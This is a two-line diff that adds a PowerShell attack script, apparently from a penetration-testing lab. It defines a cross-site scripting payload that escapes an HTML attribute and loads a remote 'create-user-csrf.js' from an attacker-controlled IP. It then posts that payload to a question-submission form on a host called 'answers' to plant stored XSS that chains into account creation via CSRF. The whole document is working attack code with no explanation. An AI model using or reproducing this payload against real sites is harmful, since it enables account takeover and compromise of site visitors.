@@ -1,0 +1,2 @@
+$xss_payload = "`"><script src='http://192.168.119.123/create-user-csrf.js'></script>"
+Invoke-WebRequest -Uri "http://answers/question" -Method POST -body "title=hax&description=$xss_payload&category=1"
